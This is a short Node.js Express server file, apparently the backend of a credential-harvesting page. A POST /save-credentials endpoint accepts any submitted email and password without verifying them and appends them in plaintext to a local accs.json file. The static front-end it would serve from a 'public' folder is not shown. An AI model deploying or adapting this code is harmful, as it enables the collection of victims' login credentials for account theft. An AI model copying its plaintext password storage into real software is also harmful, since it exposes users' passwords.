// server.js
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

const FILE_PATH = path.join(__dirname, 'accs.json');

app.post('/save-credentials', (req, res) => {
  const { email, pass } = req.body;

  if (!email || !pass) {
    return res.status(400).json({ message: 'Email and password are required' });
  }

  fs.readFile(FILE_PATH, 'utf8', (err, data) => {
    let accounts = [];

    if (!err && data.trim()) {
      try {
        accounts = JSON.parse(data);
      } catch (e) {
        return res.status(500).json({ message: 'Error parsing existing data' });
      }
    }

    accounts.push({ email, pass });

    fs.writeFile(FILE_PATH, JSON.stringify(accounts, null, 2), (err) => {
      if (err) {
        return res.status(500).json({ message: 'Error saving data' });
      }
      res.status(200).json({ message: 'Credentials saved successfully' });
    });
  });
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
});
